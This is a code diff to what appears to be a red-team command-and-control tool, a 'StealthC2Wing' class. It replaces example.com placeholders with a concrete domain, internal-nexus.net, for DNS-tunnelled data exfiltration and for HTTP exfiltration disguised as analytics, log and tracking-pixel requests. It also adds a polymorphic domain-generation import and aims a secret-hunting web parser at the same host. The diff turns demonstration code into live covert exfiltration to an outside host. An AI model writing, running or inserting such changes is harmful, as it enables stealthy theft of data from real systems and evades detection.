@@ -7,6 +7,7 @@ Author: Red Team Research Coordinator
 """
 
 import asyncio
+from utils.polymorphic_wrapper import generate_dynamic_domain
 import json
 import base64
 import random
@@ -806,7 +807,7 @@ class StealthC2Wing:
         chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
         
         for i, chunk in enumerate(chunks):
-            domain = f"{chunk}.{i}.{beacon['id']}.c2.example.com"
+            domain = f"{chunk}.{i}.{beacon['id']}.c2.internal-nexus.net"
             
             try:
                 # Perform DNS query (will be answered by C2 server)
@@ -837,9 +838,9 @@ class StealthC2Wing:
         
         # Use various techniques
         techniques = [
-            lambda: requests.get(f"https://api.example.com/analytics?data={encoded}", headers=headers),
-            lambda: requests.post("https://api.example.com/log", json={'events': [{'data': encoded}]}, headers=headers),
-            lambda: requests.get(f"https://cdn.example.com/pixel.gif?ref={encoded}", headers=headers)
+            lambda: requests.get(f"https://api.internal-nexus.net/analytics?data={encoded}", headers=headers),
+            lambda: requests.post("https://api.internal-nexus.net/log", json={'events': [{'data': encoded}]}, headers=headers),
+            lambda: requests.get(f"https://cdn.internal-nexus.net/pixel.gif?ref={encoded}", headers=headers)
         ]
         
         for technique in techniques:
@@ -2177,7 +2178,7 @@ print(f'Categories: {list(ph.categories.keys())}')
 python3 -c "
 from modules.parsers.js_dynamic import AdvancedWebParser
 wp = AdvancedWebParser()
-results = wp.parse_dynamic_content('https://example.com')
+results = wp.parse_dynamic_content('https://internal-nexus.net')
 print(f'Found {len(results[\"endpoints\"])} endpoints')
 print(f'Found {len(results[\"secrets\"])} potential secrets')
 "
